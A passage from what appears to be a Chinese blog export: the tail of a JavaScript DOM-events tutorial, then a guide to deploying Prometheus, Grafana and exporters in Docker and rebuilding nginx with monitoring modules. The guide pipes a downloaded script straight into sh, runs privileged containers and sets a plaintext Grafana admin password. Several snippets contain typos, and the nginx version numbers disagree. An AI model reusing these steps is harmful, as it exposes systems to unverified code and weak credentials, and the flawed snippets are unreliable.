console.log(&quot;聚焦&quot;); } //失去焦点 jsInput.addEventListener(&quot;blur&quot;,funcBlur,false); function funcBlur(){ console.log(&quot;离焦&quot;); } 2，鼠标单击与双击事件12345678910111213141516171819202122232425 &lt;!-- 鼠标单击事件与双击 --&gt; &lt;div id=&quot;box&quot;&gt;单击与双击&lt;/div&gt; //1、鼠标点击与双击 var jsDiv = document.getElementById(&quot;box&quot;); //console.log(jsdiv); //区分单击还是双击，使用延时定时器 var timer; //添加单击事件 jsDiv.addEventListener(&quot;click&quot;,funcOnceClick,false); function funcOnceClick(){ clearTimeout(timer); timer = setTimeout(function(){ //这里对应写单击需要执行的事件函数 console.log(&quot;单击&quot;); }, 300); //300表示0.3秒 } //添加双击事件 jsDiv.addEventListener(&quot;dblclick&quot;,funcDoubleClick,false); function funcDoubleClick(){ clearTimeout(timer); console.log(&quot;双击&quot;) } 3,鼠标事件-mouserover、mouserout、mousedown、mouseup、mousemove12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!-- 鼠标事件 --&gt; &lt;ul&gt; &lt;li&gt;鼠标进入变红色&lt;/li&gt; &lt;li&gt;鼠标离开变蓝色&lt;/li&gt; &lt;li&gt;鼠标按下字体放大2倍&lt;/li&gt; &lt;li&gt;鼠标抬起字体小2倍&lt;/li&gt; &lt;/ul&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 鼠标事件 var lis = document.getElementsByTagName(&quot;li&quot;); for (var i = 0; i &lt; lis.length; i++){ //鼠标移到标签上 lis[i].addEventListener(&quot;mouseover&quot;,function(){ this.style.backgroundColor = &quot;red&quot; },false) //mouseout鼠标从某元素移开 lis[i].addEventListener(&quot;mouseout&quot;,function(){ this.style.backgroundColor = &quot;blue&quot; },false) //mousedown 鼠标被按下 lis[i].addEventListener(&quot;mousedown&quot;,function(){ this.style.fontSize =parseInt(getComputedStyle(this,null).fontSize) * 2 +&quot;px&quot; },false); //mouseup 鼠标按键被松开 lis[i].addEventListener(&quot;mouseup&quot;,function(){ this.style.fontSize =parseInt(getComputedStyle(this,null).fontSize) / 2 +&quot;px&quot; },false); lis[i].addEventListener(&quot;mousemove&quot;,function(){ console.log(&quot;鼠标在移动&quot;) },false) } //鼠标被移动 docmunent表示整个文档，可以改为对应的标签 // document.addEventListener(&quot;mousemove&quot;,function(){ // console.log(&quot;鼠标在移动&quot;) // },false) &lt;/script&gt; 4,键盘事件 属性 描述 DOM onkeydown 某个键盘按键被按下。 2 onkeypress 某个键盘按键被按下并松开。 2 onkeyup 某个键盘按键被松开。 2 12345678910111213141516171819202122232425262728 &lt;script type=&quot;text/javascript&quot;&gt; //键盘事件 //keydown 表示按下了某个键， // document.addEventListener(&quot;keydown&quot;,function(e){ // var event = e || window.event // console.log(&quot;你按下了某个键&quot;) // console.log(event) // console.log(event.altKey,event.ctrlKey,event.shiftKey,event.key,event.keyCode ) // //提取某个键 // var youkey = event.key // console.log(&quot;你按下了&quot; + youkey + &quot;键&quot;) // },false) //keyup.某个键盘松开 document.addEventListener(&quot;keyup&quot;,function(e){ var event = e || window.event console.log(&quot;你松开了%s键&quot;, event.key ) console.log(event) console.log(event.altKey,event.ctrlKey,event.shiftKey,event.key,event.keyCode )},false) //keypress按住了某键并松开了 document.addEventListener(&quot;keypress&quot;,function(e){ var event = e || window.event console.log(&quot;你按住了%s,并松开了%s键&quot;, event.key,event.key ) console.log(event) console.log(event.altKey,event.ctrlKey,event.shiftKey,event.key,event.keyCode )},false) 4.1键盘事件的例子创建一个j文件，封装一些函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445//获取滚动高度function $scrollTop(){ return document.documentElement.scrollTop || document.body.scrollTop; }//根据id获取元素节点function $(idName){ return document.getElementById(idName); }//获取可视窗口的宽度function $w(){ return document.body.width|| docment.documentElement.Width || window.innerWidth; }//获取可视窗口的高度function $h(){ return document.body.heighet || document.documentElement.height||window.innerHeight; }//随机颜色function randomColor(){ //rgb(255,255,255) var r = parseInt(Math.random()*256); var g = parseInt(Math.random()*256); var b = parseInt(Math.random()*256); return &quot;rgb(&quot;+r+&quot;,&quot;+g+&quot;,&quot;+b+&quot;)&quot;; // &quot;#ffffff&quot;}//获取内部样式表 外部样式表中属性的属性值// obj--&gt;元素节点// at----&gt;属性名function getStyle(obj,at){ if(obj.currentStyle){ //IE return obj.currentStyle[at]; }else{ return window.getComputedStyle(obj,null)[at]; }} 写html代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;键盘事件的例子&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box{ width: 100px; height: 100px; background-color: red; position: absolute; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 1，在页面有一个div, 按下shift+C键的时候div随机改变背景色 --&gt; &lt;div id = &quot;box&quot; &gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot; src= &quot;js/3.yichen.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; //通过函数获取id为box的元素节点 var jsDiv = $(&quot;box&quot;); console.log(jsDiv); //改变颜色 document.onkeydown = function(e){ var evt = e || window.event; //按键为shift和c 键，就执行randomColor()函数 if (evt.shiftKey == true &amp;&amp; evt.keyCode == 67){ jsDiv.style.backgroundColor = randomColor(); } }; //移动 document.addEventListener(&quot;keydown&quot;,funcMove,false); function funcMove(e){ var evt =e|| window.event; switch(e.keyCode) { case 37: //像左减5px jsDiv.style.left = jsDiv.offsetLeft - 5 + &quot;px&quot;; break; case 38: //像上面减5px ,也就是像下移动 jsDiv.style.top = jsDiv.offsetTop - 5 + &quot;px&quot;; break; case 39: //向上面加 5px jsDiv.style.left =jsDiv.offsetLeft + 5 +&quot;px&quot;; break; case 40: jsDiv.style.top = jsDiv.offsetTop + 5 + &quot;px&quot;; break; } } &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 5,鼠标事件的event对象属性 属性 描述 DOM altKey 返回当事件被触发时，”ALT” 是否被按下。 2 button 返回当事件被触发时，哪个鼠标按钮被点击。 2 clientX 返回当事件被触发时，鼠标指针的水平坐标。 2 clientY 返回当事件被触发时，鼠标指针的垂直坐标。 2 ctrlKey 返回当事件被触发时，”CTRL” 键是否被按下。 2 Location 返回按键在设备上的位置 3 charCode 返回onkeypress事件触发键值的字母代码。 2 key 在按下按键时返回按键的标识符。 3 keyCode 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 which 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 metaKey 返回当事件被触发时，”meta” 键是否被按下。 2 relatedTarget 返回与事件的目标节点相关的节点。 2 screenX 返回当某个事件被触发时，鼠标指针的水平坐标。 2 screenY 返回当某个事件被触发时，鼠标指针的垂直坐标。 2 shiftKey 返回当事件被触发时，”SHIFT” 键是否被按下。 2 方法 方法 描述 W3C initMouseEvent() 初始化鼠标事件对象的值 2 initKeyboardEvent() 初始化键盘事件对象的值 3 1234567891011121314151617181920212223242526272829303132333435363738394041altKey: falsebubbles: truebutton: 0 0左键 1滚轮键 2右键 buttons: 0cancelBubble: falsecancelable: trueclientX: 107 相当于浏览器的水平坐标clientY: 19 相当于客户端浏览器的垂直坐标composed: truectrlKey: falsecurrentTarget: nulldefaultPrevented: falsedetail: 1eventPhase: 0fromElement: nullisTrusted: truelayerX: 107layerY: 19metaKey: falsemovementX: 0movementY: 0offsetX: 100 相当于div模块的水平坐标位置offsetY: 11 相当于div模块的垂直位置 pageX: 107 相当于页面的水平位置和clientX一样，这个比较常用pageY: 19 相当于页面的垂直位置和clientY一样，这个比较常用path: (5) [div#in, body, html, document, Window]relatedTarget: nullreturnValue: truescreenX: 96 相当于电脑屏幕的水平坐标位置screenY: 120 相当于电脑屏幕的垂直坐标位置shiftKey: falsesourceCapabilities: InputDeviceCapabilities {firesTouchEvents: false}srcElement: div#intarget: div#intimeStamp: 3360.8000000003813toElement: div#intype: &quot;click&quot;view: Window {parent: Window, opener: null, top: Window, length: 0, frames: Window, …}which: 1x: 107y: 19 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;鼠标事件event对象&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #in{ width: 100px; height: 100px; background-color: red; /* position: absolute; */ } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;in&quot;&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var jsDiv1 = document.getElementById(&quot;in&quot;) jsDiv1.addEventListener(&quot;click&quot;, function(e){ var ev = e || window.event; console.log(ev); },false) jsDiv1.onclick = function(e){ var evt = window.event ||e ; console.log(evt); //浏览器可视窗口坐标 console.log(&quot;浏览器的可视坐标X水平位置是%d,Y垂直位置是%d&quot;,evt.clientX,evt.clientY); //页面坐标 console.log(&quot;页面坐标pageX是 %d ,pageY是 %d &quot;,evt.pageX,evt.pageY); //电脑屏幕的坐标 console.log(&quot;电脑屏幕的坐标screenX是 %d ,sereenY是 %d &quot;,evt.screenX,evt.screenY); //按键0左键 1滚轮键 2右键 console.log(&quot;按键button是 %d &quot;, evt.button); } &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 6,事件流1234567891011121314151617181920212223242526事件的概念： HTML中与javascript交互是通过事件驱动来实现的，例如鼠标点击事件、页面的滚动事件onscroll等等，可以向文档或者文档中的元素添加事件侦听器来预订事件。想要知道这些事件是在什么时候进行调用的，就需要了解一下“事件流”的概念。什么是事件流： 1，DOM事件流， &quot;DOM2事件流&quot;规定的事件流包括三个阶段： 1，事件捕获阶段。 2，处于目标阶段。 3，事件冒泡阶段。 1，addEventListener addEventListener是DOM2级事件新增的指定事件处理程序的操作，这个方法接收3个参数：要处理的事件名，作为事件处理程序的函数和一个布尔值，最后这个布尔值如果是true，表示在捕获阶段调用事件处理程序；如果是false，表示在冒泡阶段调用事件处理程序。 2，document，documentElement和document.body三者之间的关系： document代表的是整个html页面， document.documentElement代表是的&lt;html&gt;标签。 document.body代表的是&lt;body&gt;标签。 在标准的“DOM2级事件”中规定，事件流首先是经过事件捕获阶段，接着是处于目标阶段，最后是事件冒泡阶段。这里可以画个图示意一下: 首先在事件捕获过程中，document对象首先接收到click事件，然后事件沿着DOM树依次向下，一直传播到事件的实际目标。就是id为btn的标签。 接着在事件冒泡的过程中，时间开始是由具体的元素(a标签)接收，然后逐级向上传播到较为不具体的节点。 jQuery的常用事件： 6.1 事件流阻止冒泡和默认跳转行为123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;事件流阻止冒泡&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *{ margin: 0; padding:0; } #box{ width: 100px; height: 100px; background-color: red; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box&quot;&gt; &lt;/div&gt; &lt;input type=&quot;text&quot; name=&quot;in&quot; id=&quot;put&quot; value=&quot;&quot; /&gt; &lt;a href =&quot;red.html&quot; id =&quot;link&quot;&gt;点我跳转&lt;/a&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.body.onclick = function(){ this.style.backgroundColor =&quot;yellow&quot; } document.getElementById(&quot;box&quot;).onclick = function(e){ var ev = e || window.event //把后面冒泡事件不让他执行 ev.stopPropagation() this.style.backgroundColor =&quot;blue&quot; } document.getElementById(&quot;put&quot;).onclick=function(e){ var ev = e || window.event //把后面冒泡事件不让他执行 ev.stopPropagation() } document.getElementById(&quot;link&quot;).onclick=function(e){ var ev = e || window.event //把后面冒泡事件不让他执行 ev.stopPropagation() var info = window.confirm(&quot;你浏览的网页存在风险，是否继续??&quot;) if (info == false){ //阻止跳转的默认行为 ev.preventDefault() } } &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 4,css和js常用模块Swiper512https://www.swiper.com.cn/usage/index.html","link":"/2020/08/04/Javascript%E5%9F%BA%E7%A1%80/"},{"title":"Prometheus搭建部署","text":"Prometheus搭建部署官网地址：https://prometheus.io/ 安装准备 同步时间 timedatectl set-timezone Asia/Shanghai 我这台服务器ip是192.168.224.11登入，建立相应文件夹 12345mkdir -p promethuesmkdir -p promethues/servermkdir -p promethues/clienttouch promethues/server/rules.ymlchmod 777 promethues/server/rules.yml 一，安装Prometheus Server通过docker方式 1234567891011安装dockercurl -fsSl https://get.docker.com | shsystemctl start dockersystemctl enable docker安装自动补全插件yum install -y bash-completionsource /usr/share/bash-completion/completions/dockersource /usr/share/bash-completion/bash_completion Docker 部署 Prometheus 说明： 监控端安装：Prometheus Server(普罗米修斯监控主服务器 )Node Exporter (收集Host硬件和操作系统信息)cAdvisor (负责收集Host上运行的容器信息)Grafana (展示普罗米修斯监控界面） 被监控安装：Node Exporter (收集Host硬件和操作系统信息)cAdvisor (负责收集Host上运行的容器信息) 1.安装Node Exporter 所有服务器安装 Node Exporter 收集系统信息，用于监控CPU、内存、磁盘使用率、磁盘读写等系统信息 –net=host，这样 Prometheus Server 可以直接与 Node Exporter 通信 12345678910docker run -d -p 9100:9100 \\-v &quot;/proc:/host/proc&quot; \\-v &quot;/sys:/host/sys&quot; \\-v &quot;/:/rootfs&quot; \\-v &quot;/etc/localtime:/etc/localtime&quot; \\--net=host \\prom/node-exporter \\--path.procfs /host/proc \\--path.sysfs /host/sys \\--collector.filesystem.ignored-mount-points &quot;^/(sys|proc|dev|host|etc)($|/)&quot; 2.安装cAdvisor 所有服务器安装 cAdvisor 收集docker信息，用于展示docker的cpu、内存、上传下载等信息 –net=host，这样 Prometheus Server 可以直接与 cAdvisor 通信 123456789101112docker run -d \\-v &quot;/etc/localtime:/etc/localtime&quot; \\--volume=/:/rootfs:ro \\--volume=/var/run:/var/run:rw \\--volume=/sys:/sys:ro \\--volume=/var/lib/docker/:/var/lib/docker:ro \\--volume=/dev/disk/:/dev/disk:ro \\--publish=18104:8080 \\--detach=true \\--name=cadvisor \\--privileged=true \\google/cadvisor:latest 12可以进入容器查看：sudo docker exec -it 容器id /bin/sh 3.安装Prometheus Server监控端安装 1）编辑配置文件 首先在本地创建 prometheus.yml 这是普罗米修斯的配置文件 将下方内容写入到文件中 将监听的地址改为自己本机地址 123456789101112131415161718192021222324252627282930# my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global 'evaluation_interval'.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot; # A scrape configuration containing exactly one endpoint to scrape:# Here it's Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: 'prometheus' # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: #监听的地址s - targets: ['localhost:9090','192.168.224.11:8088','192.168.224.11:9090'] 2）启动容器 1&gt; prometheus.yml配置文件 prometheus.yml内需配置外网ip，内网ip除了本机，在grafana识别不到！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# my global configlobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global 'evaluation_interval'.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot; # A scrape configuration containing exactly one endpoint to scrape:# Here it's Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: 'prometheus' # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: #监听的地址（此处为服务器内网ip） - targets: ['10.27.158.33:9090','10.27.158.33:9100','10.27.158.33:18104'] - targets: ['10.29.46.54:9100','10.29.46.54:18104'] - targets: ['10.27.163.172:9100','10.27.163.172:18104'] # - job_name: 'GitLab'# metrics_path: '/-/metrics'# static_configs:# - targets: ['172.23.0.241:10101'] - job_name: 'jenkins' metrics_path: '/prometheus/' scheme: http bearer_token: bearer_token static_configs: - targets: ['172.23.0.242:8080'] - job_name: &quot;Nginx&quot; metrics_path: '/status/format/prometheus' static_configs: - targets: ['172.23.0.242:8088'] 2&gt;启动命令 –net=host，这样 Prometheus Server 可以直接与 Exporter 和 Grafana 通 12345678910docker run -d -p 9090:9090 \\-v /root/Prometheus/prometheus.yml:/etc/prometheus/prometheus.yml \\-v &quot;/etc/localtime:/etc/localtime&quot; \\--name prometheus \\--net=host \\prom/prometheus:latest # 当Prometheus容器启动成功后访问# PS：服务器需开启eth0的外网端口，才可用浏览器访问 9090 0.0.0.0192.168.224.11:9090 访问http://192.168.224.11:9090 访问http://192.168.224.11:9090/metrics 我们配置了9090端口，默认prometheus会抓取自己的/metrics接口在Graph选项已经可以看到监控的数据 4.创建运行Grafana 监控服务器安装 用于图像化显示 1234567891011docker run -d -i -p 3000:3000 \\-v &quot;/etc/localtime:/etc/localtime&quot; \\-e &quot;GF_SERVER_ROOT_URL=http://grafana.server.name&quot; \\-e &quot;GF_SECURITY_ADMIN_PASSWORD=admin8888&quot; \\--net=host \\grafana/grafana # PS：服务器需开启eth0的外网端口，才可用浏览器访问：3000 0.0.0.0Grafana启动后，在浏览器中打开 192.168.224.11:3000 登录界面，登录： 用户名：admin 密码：admin8888 1）添加普罗米修斯服务器 填写相关数据源信息 为添加好的数据源做图形显示 5.添加监控模板 自己手工创建dashboard有点困难，可以借助开元的力量访问 [监控模板地址]https://grafana.com/grafana/dashboards将会看到很多用于监控 Docker 的 Dashboard。监控模板地址(多种监控模板根据自己需求下载不同的模板) 监控模板地址 有些dashboard可以下载后直接导入，而有些需要修改后再导入，需要看dashboard的overview 6.键值查询通过指标 io_namespace_http_requests_total 我们可以： 1234查询应用的请求总量 sum(io_namespace_http_requests_total)查询每秒Http请求量 sum(rate(io_wise2c_gateway_requests_total[5m]))查询当前应用请求量Top N的URI topk(10, sum(io_namespace_http_requests_total) by (path)) 配置Prometheus监控Nginx 1、需给Nginx安装两个模块，才可用Prometheus来监控：nginx-module-vts、geoip 2、思路：原来无论是编译、还是yum装的nginx，都需要下载同版本的tar包，基于原来安装选项的基础上，增加以上两个模块选项，进行编译安装，来替换原来的nginx，最终将原nginx目录的配置文件如nginx.conf文件、conf.d目录再移动到编译安装后的nignx目录内，最后启动nginx即可 这里官方源安装：1）配置官方源 12345678 vim /etc/yum.repos.d/nginx.repo[nginx-stable]name=nginx stable repobaseurl=http://nginx.org/packages/centos/7/$basearch/gpgcheck=1enabled=1gpgkey=https://nginx.org/keys/nginx_signing.keymodule_hotfixes=true 2）安装依赖 1yum install -y gcc gcc-c++ autoconf pcre pcre-devel make automake wget httpd-tools vim tree 3）安装nginx 1yum install -y nginx 4）配置nginx 1vim /etc/nginx/nginx.conf 5）启动服务 12直接启动如果有报错==》重大错误，80端口有占用==》查看占用端口的服务HTTPD，停掉，在重启nginxsystemctl start nginx 1.查看当前Nginx安装选项 123456nginx -Vnginx version: nginx/1.24.0built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017TLS SNI support enabledconfigure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie' 2.准备模块 123456789下载、解压新包 wget http://nginx.org/download/nginx-1.16.1.tar.gz tar xf nginx-1.16.1.tar.gz 克隆下载 nginx-module-vts 模块git clone https://github.com/vozlt/nginx-module-vts安装GeoIP模块 yum -y install epel-release geoip-devel 3.停止Nginx服务 12345678910 停止nginx服务 nginx -s stop # 备份原nginx启动文件 which nginx/usr/sbin/nginxmv /usr/sbin/nginx /usr/sbin/nginx.bak # 备份原nignx目录mv /etc/nginx nginx-1.12.2.bak 4.编译安装 1&gt; 安装所需依赖 1234编译安装时可能会出现 `make: *** 没有规则可以创建“default”需要的目标“build”。 停止`的报错，是因为缺少依赖导致安装依赖后在进行编译，否则装完依赖还得重新./configure ~yum install -y gcc gcc++ bash-completion vim lrzsz wget expect net-tools nc nmap tree dos2unix htop iftop iotop unzip telnet sl psmisc nethogs glances bc pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-dev libxslt-devel gd gd-devel perl-devel perl-ExtUtils-Embed GeoIP GeoIP-devel GeoIP-data pcre-devel 2&gt; 编译安装 进入刚刚解压的nginx目录，编译安装 基于原来安装参数，尾部追加连个参数 –add-module=/root/packages/nginx-module-vts–with-http_geoip_module 1./configure --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie' --add-module=/root/nginx-module-vts --with-http_geoip_module 123编译安装# -j 多核编译（配置低的不建议使用此参数，会卡住~）make -j &amp;&amp; make install 5.配置Nginx 123cp -r nginx-1.12.2.bak/conf.d/ /etc/nginx/cp -r nginx-1.12.2.bak/nginx.conf /etc/nginx/rm -f /etc/nginx/conf.d/default.conf 配置Nginx配置文件 http层 server层 12345678910111213141516171819202122232425262728293031323334 ···http { ··· include /etc/nginx/conf.d/*.conf; ##################### 1.http层：添加三行配置 ##################### vhost_traffic_status_zone; vhost_traffic_status_filter_by_host on; geoip_country /usr/share/GeoIP/GeoIP.dat; ##################### 2.server层：指定server层端口号，建议8088端口，不冲突直接复制粘贴即可##################### server { listen 8088; server_name localhost; # 以下vhost配置写在此location内 location /status { vhost_traffic_status on; # 流量状态，默认即为on，可不写此行 vhost_traffic_status_display; vhost_traffic_status_display_format html; vhost_traffic_status_filter_by_set_key $uri uri::$server_name; #每个uri访问量 vhost_traffic_status_filter_by_set_key $geoip_country_code country::$server_name; #不同国家/区域请求量 vhost_traffic_status_filter_by_set_key $status $server_name; #http code统计 vhost_traffic_status_filter_by_set_key $upstream_addr upstream::backend; #后端&gt;转发统计 vhost_traffic_status_filter_by_set_key $remote_port client::ports::$server_name; #请求端口统计 vhost_traffic_status_filter_by_set_key $remote_addr client::addr::$server_name; #请求IP统计 location ~ ^/storage/(.+)/.*$ { set $volume $1; vhost_traffic_status_filter_by_set_key $volume storage::$server_name; #请求路径统计 } } } ##################### server层：可新建一个server，或在原有的不打紧的配置上修改也可以#####################} 6.启动Nginx 12nginxnetstat -putnal |grep nginx 123浏览器访问：192.168.224.11:80 # nginx 默认官方页面192.168.224.11:8088/status #nignx 监控项页面 7.使用Prometheus监控 prometheus服务端配置prometheus.yml，并重启prometheus容器 metrics_path：定义接口后缀类型，默认为/metrics 即我们输入ip+端口后，浏览器会自动追加/metrics后缀 1234567891011vim prometheus.yml···scrape_configs: - job_name: &quot;Nginx&quot; metrics_path: '/status/format/prometheus' static_configs: - targets: ['192.168.224.11:8088']··· docker restart prometheus此时进入prometheus管理页面，则能查询nginx的监控项 8.各个监控项的含义Nginx-module-vts提供了多种监控项，了解监控项含义，有助于帮助自己生成需要的图表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190# HELP nginx_vts_info Nginx info# TYPE nginx_vts_info gaugenginx_vts_info{hostname=&quot;hbhly_21_205&quot;,version=&quot;1.16.1&quot;} 1# HELP nginx_vts_start_time_seconds Nginx start time# TYPE nginx_vts_start_time_seconds gaugenginx_vts_start_time_seconds 1584268136.439# HELP nginx_vts_main_connections Nginx connections# TYPE nginx_vts_main_connections gauge # 区分状态的nginx连接数nginx_vts_main_connections{status=&quot;accepted&quot;} 9271nginx_vts_main_connections{status=&quot;active&quot;} 7nginx_vts_main_connections{status=&quot;handled&quot;} 9271nginx_vts_main_connections{status=&quot;reading&quot;} 0nginx_vts_main_connections{status=&quot;requests&quot;} 438850nginx_vts_main_connections{status=&quot;waiting&quot;} 6nginx_vts_main_connections{status=&quot;writing&quot;} 1# HELP nginx_vts_main_shm_usage_bytes Shared memory [ngx_http_vhost_traffic_status] info# TYPE nginx_vts_main_shm_usage_bytes gauge # 内存使用量nginx_vts_main_shm_usage_bytes{shared=&quot;max_size&quot;} 1048575nginx_vts_main_shm_usage_bytes{shared=&quot;used_size&quot;} 24689nginx_vts_main_shm_usage_bytes{shared=&quot;used_node&quot;} 7# HELP nginx_vts_server_bytes_total The request/response bytes# TYPE nginx_vts_server_bytes_total counter# HELP nginx_vts_server_requests_total The requests counter# TYPE nginx_vts_server_requests_total counter# HELP nginx_vts_server_request_seconds_total The request processing time in seconds# TYPE nginx_vts_server_request_seconds_total counter# HELP nginx_vts_server_request_seconds The average of request processing times in seconds# TYPE nginx_vts_server_request_seconds gauge# HELP nginx_vts_server_request_duration_seconds The histogram of request processing time# TYPE nginx_vts_server_request_duration_seconds histogram# HELP nginx_vts_server_cache_total The requests cache counter# TYPE nginx_vts_server_cache_total counter # 分Host的进出流量nginx_vts_server_bytes_total{host=&quot;10.160.21.205&quot;,direction=&quot;in&quot;} 22921464nginx_vts_server_bytes_total{host=&quot;10.160.21.205&quot;,direction=&quot;out&quot;} 1098196005 # 分状态码的请求数量统计 1** 2** 3** 4** 5**nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;1xx&quot;} 0nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;2xx&quot;} 86809nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;3xx&quot;} 0nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;4xx&quot;} 2nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;5xx&quot;} 0nginx_vts_server_requests_total{host=&quot;10.160.21.205&quot;,code=&quot;total&quot;} 86811 # 响应时间nginx_vts_server_request_seconds_total{host=&quot;10.160.21.205&quot;} 0.000nginx_vts_server_request_seconds{host=&quot;10.160.21.205&quot;} 0.000 # 分状态的缓存的统计nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;miss&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;bypass&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;expired&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;stale&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;updating&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;revalidated&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;hit&quot;} 0nginx_vts_server_cache_total{host=&quot;10.160.21.205&quot;,status=&quot;scarce&quot;} 0nginx_vts_server_bytes_total{host=&quot;devapi.feedback.test&quot;,direction=&quot;in&quot;} 